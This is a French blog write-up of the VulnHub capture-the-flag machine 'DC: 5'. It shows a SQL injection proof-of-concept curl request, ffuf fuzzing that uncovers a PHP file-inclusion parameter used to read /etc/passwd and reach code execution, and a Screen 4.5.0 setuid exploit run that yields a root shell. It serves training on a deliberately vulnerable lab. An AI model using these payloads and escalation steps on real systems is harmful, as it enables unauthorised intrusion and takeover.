---
title: "Solution du CTF DC: 5 de VulnHub"
tags: [VulnHub, CTF]
---

5ᵉ épisode de cette série de CTF signée [DCAU7](https://www.five86.com/index.html). Il faut sans doute un peu d'expérience en CTF pour tenter les actions qui permettent d'avancer sur ce CTF.

Ule liste telle que [celle-ci](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) peut être utile.

Grosso-modo Nmap retourne un serveur web sur le port 80. Le reste (portmap + status) n'a pas d'importance.

## You Can't Teach an Old Dog New Tricks

Le site web est composé de quelques scripts et je décide de lancer Wapiti dessus :
```bash
wapiti -u http://192.168.56.135/ -v2 --color -m all
```

Ce dernier trouve deux paramètres vulnérables à des injections SQL de type boolean-based. Le PoC cURL donné est le suivant :

```bash
curl "http://192.168.56.135/thankyou.php?firstname=default&lastname=default&country=other%22%29%20AND%2068%3D68%20AND%20%28%2296%22%3D%2296&subject=Hi%20there%21" -e "http://192.168.56.135/contact.php"
```

C'est étonnant, car si on change la comparaison dans la requête SQL injectée on ne voit à priori pas de différences dans la réponse.
En réalité après plusieurs essais, on voit que du contenu change et ce même sans passer de paramètres au script :

```console
$ curl -s http://192.168.56.135/thankyou.php | grep Copyr
                                Copyright © 2018                        </footer>
$ curl -s http://192.168.56.135/thankyou.php | grep Copyr
                                Copyright © 2020                        </footer>
$ curl -s http://192.168.56.135/thankyou.php | grep Copyr
                                Copyright © 2017                        </footer>
$ curl -s http://192.168.56.135/thankyou.php | grep Copyr
                                Copyright © 2019                        </footer>
```

Dans la réalité, on penserait load-balancing et/ou cache. Mais ici on pense plutôt variable qui prend une valeur aléatoire si non renseignée.

Je décide donc de bruteforcer un nom de paramètre sur le script comme j'ai pu le faire notamment sur le [CTF Insomnia]({% link _posts/2022-12-06-Solution-du-CTF-Insomnia-de-VulnHub.md %}).

```console
$ ffuf -u "http://192.168.56.135/thankyou.php?FUZZ=/etc/passwd" -w common_query_parameter_names.txt -fs 852

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.135/thankyou.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: common_query_parameter_names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 852
________________________________________________

file                    [Status: 200, Size: 2319, Words: 41, Lines: 71]
:: Progress: [5699/5699] :: Job [1/1] :: 2776 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

Le paramètre file s'avère être bien une inclusion PHP. J'ai choisi une fois de plus d'utiliser [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) pour transformer cette LFI en RCE.

## Getting lucky

Pour l'escalade de privilèges, on retrouve un Screen en version 4.5.0 comme sur le CTF [FSoft]({% link _posts/2022-12-04-Solution-du-CTF-FSoft-Challenges-VM-de-VulnHub.md %}) ou le [Nully Security]({% link _posts/2022-11-30-Solution-du-CTF-Nully-Cybersecurity-de-VulnHub.md %}).  

```console
www-data@dc-5:/home/dc$ ls -alh /bin/screen-4.5.0
-rwsr-xr-x 1 root root 1.4M Apr 19  2019 /bin/screen-4.5.0
```

L'exploit n'a pas fonctionné tout de suite. En particulier l'écriture via le screen a l'air de fonctionner un peu comme elle veut, mais ça a fini par fonctionner :

```console
www-data@dc-5:/tmp$ chmod +x screen_exploit.sh 
www-data@dc-5:/tmp$ ./screen_exploit.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/usr/bin/ld: cannot open output file /tmp/rootshell: Permission denied
collect2: error: ld returned 1 exit status
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
thisistheflag.txt
# cat thisistheflag.txt 


888b    888 d8b                                                      888      888 888 888 
8888b   888 Y8P                                                      888      888 888 888 
88888b  888                                                          888      888 888 888 
888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 
888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 
888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P 
888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  
888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 
                                                                                          
                                                                                          


Once again, a big thanks to all those who do these little challenges,
and especially all those who give me feedback - again, it's all greatly
appreciated.  :-)

I also want to send a big thanks to all those who find the vulnerabilities
and create the exploits that make these challenges possible.
```
